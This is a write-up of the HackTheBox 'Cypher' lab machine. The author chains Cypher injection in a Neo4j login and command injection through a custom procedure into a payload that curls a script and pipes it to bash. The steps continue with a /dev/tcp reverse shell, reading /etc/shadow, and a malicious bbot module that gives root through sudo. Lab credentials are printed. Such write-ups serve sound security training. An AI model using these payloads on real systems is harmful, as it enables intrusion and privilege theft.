<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <title>Cypher - Hexicon Archives</title>
    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
    <link rel="stylesheet" href="../style.css">
    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Cypher.html" />
    <!-- Machine-specific metadata for SEO -->
    <meta name="description" content="Detailed writeup for Cypher machine from HackTheBox - Medium difficulty level">
    <meta name="keywords" content="HackTheBox, Cypher, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
</head>
<body>
    <header>
        <div class="container header-content">
            <a href="../machines.html" class="logo">Machine writeups</a>
            <div class="header-controls">
                <a href="../index.html" class="htb-icon" title="Link to the main page">
                    <img src="../favicon.png" alt="Archive" width="30" height="30">
                </a>
                <div class="hamburger-menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </header>
    
    <div class="sidebar">
        <div class="difficulty-buttons">
            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
            <div class="machine-list" id="easy-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <div class="machine-list" id="medium-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
            <div class="machine-list" id="hard-machines">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
            <div class="machine-list" id="insane-machines">
                <!-- Will be populated dynamically -->
            </div>
        </div>
    </div>
    
    <div class="backdrop"></div>
    
    <main class="container writeup-content">
        <h1 class="writeup-title">Cypher</h1>
        <div class="writeup-metadata">
            <span class="difficulty medium">Medium</span>
            <span class="date">July 25, 2025</span>
        </div>
        
        <div class="writeup-container">
            <div class="writeup-body">
                <!-- Machine-specific content goes here -->
                <p><img alt="pwned" src="../images/Cypher/pwned.png" /></p>
<p>Cypher was a medium-difficulty Linux box featuring SSH on port 22 and a custom web application on port 80.
Initial reconnaissance revealed a login form backed by a Neo4j graph database.
Testing for cypher injection by inserting a single quote character triggered database errors, confirming the vulnerability in the authentication endpoint.
Directory enumeration exposed a /testing endpoint containing a downloadable JAR file. Decompiling the Java archive with jd-gui revealed custom Neo4j procedures, including a vulnerable custom.getUrlStatusCode function that executed system commands via curl. The procedure constructed shell commands by directly concatenating user input.
Exploiting the cypher injection, I crafted a payload that called the vulnerable procedure:
<code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//</code>
The semicolon separator bypassed output redirection to /dev/null, allowing command execution and establishing a reverse shell as the neo4j user.</p>
<p>Local enumeration revealed user graphasm's home directory containing a bbot configuration file with Neo4j credentials (neo4j:cU4btyib.20xtCMCXkBmerhK).
These credentials provided SSH access as graphasm, who had sudo privileges to run the bbot OSINT tool as root.</p>
<p>Privilege escalation exploited bbot's custom module loading functionality. By creating a malicious Python module in /tmp/modules with a reverse shell payload in the setup() function and configuring bbot to load custom modules via module_dirs, I achieved root access when the module was executed with sudo privileges.</p>
<h1>User flag</h1>
<p><img alt="nmap" src="../images/Cypher/nmap.png" /></p>
<p>Initial nmap scan reveals 2 ports. SSH on 22 and a website on 80.</p>
<h2>Cypher injection in the login form</h2>
<p><img alt="web" src="../images/Cypher/web.png" /></p>
<p>The demo button redirects me to a login form. I have no credentials, so I'll take a look at the page's source code.</p>
<p><img alt="script" src="../images/Cypher/script.png" /></p>
<p>This website uses Neo4j as a database. I will check for cypher injection in the login fields.</p>
<p>For this, I will use burpsuite to keep everything tidy and easy to see.</p>
<p><img alt="query" src="../images/Cypher/query.png" /></p>
<p>The query it is running under the hood is:</p>
<p><code>MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = 'INPUT' return h.value as hash</code></p>
<p>Where INPUT is the value put into the username field.</p>
<h2>Fuzzing the website</h2>
<p><code>dirsearch -u http://cypher.htb/ --exclude-sizes=22B</code></p>
<p><img alt="dir" src="../images/Cypher/dir.png" /></p>
<p>There is a <code>testing</code> endpoint. I'll check it out right away.</p>
<p><img alt="jar" src="../images/Cypher/jar.png" /></p>
<p>There is a JAR(Java archive) file available for download. I'll get it onto my box to examine it.</p>
<p>I will use jd-gui to decompile the archive.</p>
<h2>JAR file decompilation and analysis</h2>
<p><img alt="class" src="../images/Cypher/class.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span><span class="w"> </span><span class="n">com</span><span class="o">.</span><span class="n">cypher</span><span class="o">.</span><span class="n">neo4j</span><span class="o">.</span><span class="n">apoc</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.stream.Stream</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Description</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Mode</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Name</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Procedure</span><span class="p">;</span>

<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">HelloWorldProcedure</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nd">@Procedure</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;custom.helloWorld&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Mode</span><span class="o">.</span><span class="n">READ</span><span class="p">)</span>
<span class="w">  </span><span class="nd">@Description</span><span class="p">(</span><span class="s2">&quot;A simple hello world procedure&quot;</span><span class="p">)</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">Stream</span><span class="o">&lt;</span><span class="n">HelloWorldOutput</span><span class="o">&gt;</span><span class="w"> </span><span class="n">helloWorld</span><span class="p">(</span><span class="nd">@Name</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello, &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;!&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Stream</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">HelloWorldOutput</span><span class="p">(</span><span class="n">greeting</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">HelloWorldOutput</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="p">;</span>

<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">HelloWorldOutput</span><span class="p">(</span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">greeting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">greeting</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>This is just a simple greeting class that greets the user. Not very interesting, but the second class contains something I could definitely use.</p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span><span class="w"> </span><span class="n">com</span><span class="o">.</span><span class="n">cypher</span><span class="o">.</span><span class="n">neo4j</span><span class="o">.</span><span class="n">apoc</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Arrays</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.concurrent.TimeUnit</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.stream.Stream</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Description</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Mode</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Name</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Procedure</span><span class="p">;</span>

<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">CustomFunctions</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nd">@Procedure</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;custom.getUrlStatusCode&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Mode</span><span class="o">.</span><span class="n">READ</span><span class="p">)</span>
<span class="w">  </span><span class="nd">@Description</span><span class="p">(</span><span class="s2">&quot;Returns the HTTP status code for the given URL as a string&quot;</span><span class="p">)</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">Stream</span><span class="o">&lt;</span><span class="n">StringOutput</span><span class="o">&gt;</span><span class="w"> </span><span class="n">getUrlStatusCode</span><span class="p">(</span><span class="nd">@Name</span><span class="p">(</span><span class="s2">&quot;url&quot;</span><span class="p">)</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">url</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">!</span><span class="n">url</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&quot;https://&quot;</span><span class="p">))</span>
<span class="w">      </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nb">String</span><span class="p">[]</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;curl -s -o /dev/null --connect-timeout 1 -w %</span><span class="si">{http_code}</span><span class="s2"> &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Arrays</span><span class="o">.</span><span class="n">toString</span><span class="p">((</span><span class="n">Object</span><span class="p">[])</span><span class="n">command</span><span class="p">));</span>
<span class="w">    </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
<span class="w">    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">inputReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">()));</span>
<span class="w">    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">errorReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getErrorStream</span><span class="p">()));</span>
<span class="w">    </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">errorOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span>
<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">errorReader</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">null</span><span class="p">)</span>
<span class="w">      </span><span class="n">errorOutput</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputReader</span><span class="o">.</span><span class="n">readLine</span><span class="p">();</span>
<span class="w">    </span><span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Status code: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">statusCode</span><span class="p">);</span>
<span class="w">    </span><span class="n">boolean</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">waitFor</span><span class="p">(</span><span class="mi">10</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="n">TimeUnit</span><span class="o">.</span><span class="n">SECONDS</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">exited</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">process</span><span class="o">.</span><span class="n">destroyForcibly</span><span class="p">();</span>
<span class="w">      </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="w">      </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Process timed out after 10 seconds&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nb">int</span><span class="w"> </span><span class="n">exitCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">exitValue</span><span class="p">();</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">exitCode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Process exited with code &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">exitCode</span><span class="p">);</span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errorOutput</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">      </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Error output:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">errorOutput</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span><span class="w"> </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Stream</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">StringOutput</span><span class="p">(</span><span class="n">statusCode</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">StringOutput</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="p">;</span>

<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">StringOutput</span><span class="p">(</span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statusCode</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>If I can somehow call the <code>custom.getUrlStatusCode</code> procedure, I'll be able to achieve code execution. By passing in the http address like this <code>custom.getUrlStatusCode('http://10.10.16.75/test')</code>, I'll be able to make it call back to my server.</p>
<h2>Shell as neo4j</h2>
<p>After much searching and testing, I found a command that successfully made contact with my server.</p>
<p><code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http://10.10.16.75:8000/test') YIELD statusCode AS hash RETURN hash;//"</code></p>
<p>It returns an <code>Invalid credentials</code> error message, but reaches out to my python server regardless.</p>
<p><img alt="python" src="../images/Cypher/python.png" /></p>
<p>I'll prepare a single reverse shell file, and I'll modify my command slightly.</p>
<div class="codehilite"><pre><span></span><code># shell.sh

#!/bin/bash

bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.75/9001 0&gt;&amp;1&#39;
</code></pre></div>

<p>However, nothing happens on my netcat listener. This is because of the <code>-o /dev/null</code> part in the vulnerable bash command. It'll throw away everything that curl tries to pass, aside from the grabbed status code. This can be solved rather easily.</p>
<p>I'll add a separator <code>;</code> at the end, and then I'll repeat the curl command, which should work as intended. I'll then pipe the shell to bash.</p>
<p><code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//"</code></p>
<p>The shell hit my listener almost instantly.</p>
<p><img alt="shell" src="../images/Cypher/shell.png" /></p>
<p>On the box, I began searching around and found a user whose home directory I could enter.</p>
<p><img alt="directory" src="../images/Cypher/directory.png" /></p>
<p>While I cannot read the user flag yet, I can take a look at the .yml config file.</p>
<div class="codehilite"><pre><span></span><code>targets:
  <span class="k">-</span> ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
</code></pre></div>

<p>There is a password. I will try logging into the box as graphasm with these credentials.</p>
<p><img alt="user" src="../images/Cypher/user.png" /></p>
<h1>Root flag</h1>
<h2>Looking for a privesc opportunity</h2>
<p><img alt="sudol" src="../images/Cypher/sudol.png" /></p>
<p>Graphasm can run <code>bbot</code> as root, which is some sort of an OSINT tool.</p>
<p>Looking at its help menu, there are a few interesting options.</p>
<div class="codehilite"><pre><span></span><code>  -c [CONFIG ...], --config [CONFIG ...]
                        Custom config options in key=value format: e.g. &#39;modules.shodan.api_key=1234&#39;

  --dry-run             Abort before executing scan

  -d, --debug           Enable debugging
</code></pre></div>

<p>And a few more. If I can specify <code>anything</code> as a config input, and the debug options will allow for more verbose data sendback, I could read files like root's SSH key or the /etc/shadow file.</p>
<p><code>sudo /usr/local/bin/bbot --dry-run -d -c /etc/shadow</code></p>
<p>However, this returned an error.</p>
<p>I managed to get the desired output by adding a <code>y</code> to the -c flag.</p>
<p><img alt="shadow" src="../images/Cypher/shadow.png" /></p>
<h2>Getting a root shell</h2>
<p>When I tried grabbing root's SSH key at <code>/root/authorized_keys</code>, nothing was displayed back.</p>
<p>I began wondering whether it is possible to do other things using bbot, and I found the program's developer manual.</p>
<p><code>https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/#create-the-python-file</code></p>
<p>I copied over the example module, and made a few edits.</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">bbot.modules.base</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">BaseModule</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>

<span class="k">class</span><span class="w"> </span><span class="nc">whois</span><span class="p">(</span><span class="n">BaseModule</span><span class="p">):</span>
<span class="w">    </span><span class="n">watched_events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;DNS_NAME&quot;</span><span class="p">]</span><span class="w"> </span><span class="c1"># watch for DNS_NAME events</span>
<span class="w">    </span><span class="n">produced_events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;WHOIS&quot;</span><span class="p">]</span><span class="w"> </span><span class="c1"># we produce WHOIS events</span>
<span class="w">    </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;passive&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;safe&quot;</span><span class="p">]</span>
<span class="w">    </span><span class="n">meta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Query WhoisXMLAPI for WHOIS data&quot;</span><span class="p">}</span>
<span class="w">    </span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;api_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">}</span><span class="w"> </span><span class="c1"># module config options</span>
<span class="w">    </span><span class="n">options_desc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;api_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WhoisXMLAPI Key&quot;</span><span class="p">}</span>
<span class="w">    </span><span class="n">per_domain_only</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">True</span><span class="w"> </span><span class="c1"># only run once per domain</span>

<span class="w">    </span><span class="n">base_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://www.whoisxmlapi.com/whoisserver/WhoisService&quot;</span>

<span class="w">    </span><span class="c1"># one-time setup - runs at the beginning of the scan</span>
<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="k">def</span><span class="w"> </span><span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.75/9001 0&gt;&amp;1&#39;&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;api_key&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="p">:</span>
<span class="w">            </span><span class="c1"># soft-fail if no API key is set</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">None</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Must set API key&quot;</span>

<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="k">def</span><span class="w"> </span><span class="nf">handle_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">event</span><span class="p">):</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">hugesuccess</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Got </span><span class="si">{</span><span class="n">event</span><span class="si">}</span><span class="s2"> (event.data: </span><span class="si">{</span><span class="n">event</span><span class="o">.</span><span class="n">data</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="n">_</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">helpers</span><span class="o">.</span><span class="n">split_domain</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
<span class="w">        </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?apiKey=</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="si">}</span><span class="s2">&amp;domainName=</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&amp;outputFormat=JSON&quot;</span>
<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">hugeinfo</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Visiting </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">helpers</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="ow">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="kc">None</span><span class="p">:</span>
<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">emit_event</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">(),</span><span class="w"> </span><span class="s2">&quot;WHOIS&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">parent</span><span class="o">=</span><span class="n">event</span><span class="p">)</span>
</code></pre></div>

<p>When I run this module, I should receive a root shell on my listener.</p>
<p>There are a few things that need to be done before though. First, I'll make a <code>/tmp/modules</code> directory, to not interfere with the regular bbot modules.</p>
<p>Then, I'll create a conf.yml file containing the following lines:</p>
<div class="codehilite"><pre><span></span><code>targets:
  <span class="k">-</span> ecorp.htb

output_dir: /home/graphasm/bbot_scans
module_dirs:
  <span class="k">-</span> /tmp/modules

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
</code></pre></div>

<p>I copied the original bbot config, but added the module_dirs entry as instructed in the developer manual.</p>
<p>I placed the malicious module in the modules directory and ran this command.</p>
<p><code>sudo /usr/local/bin/bbot -p ./conf.yml -m whois</code></p>
<p><img alt="root" src="../images/Cypher/root.png" /></p>
<p>Rooted!</p>
            </div>
            
            <div class="toc-sidebar">
                <h3>Contents</h3>
                <ul id="toc-list">
                    <!-- This will be populated by JavaScript -->
                </ul>
            </div>
        </div>
    </main>
    
    <!-- Mobile TOC toggle button -->
    <button class="toc-toggle" aria-label="Toggle table of contents">
        â‰¡
    </button>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
        </div>
    </footer>

    <!-- Include the Markdown parser (not needed for static HTML) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
    
    <script>
        // Machine metadata for sidebar population
        let machineData = {};
        
        // Function to initialize the application
        async function initializeApp() {
            try {
                // Fetch machine metadata
                const response = await fetch('../machines.json');
                if (!response.ok) {
                    throw new Error('Failed to load machine metadata');
                }
                machineData = await response.json();
                
                // Populate the sidebar with machine links
                populateSidebar();
                
                // Generate table of contents
                generateTableOfContents();
            } catch (error) {
                console.error('Initialization error:', error);
                showError("Failed to initialize application. Please refresh and try again.");
            }
        }

        // Call the initialization function when the page loads
        document.addEventListener('DOMContentLoaded', initializeApp);

        // Populate sidebar with machine links dynamically
        function populateSidebar() {
            const categories = {
                "easy": document.getElementById("easy-machines"),
                "medium": document.getElementById("medium-machines"),
                "hard": document.getElementById("hard-machines"),
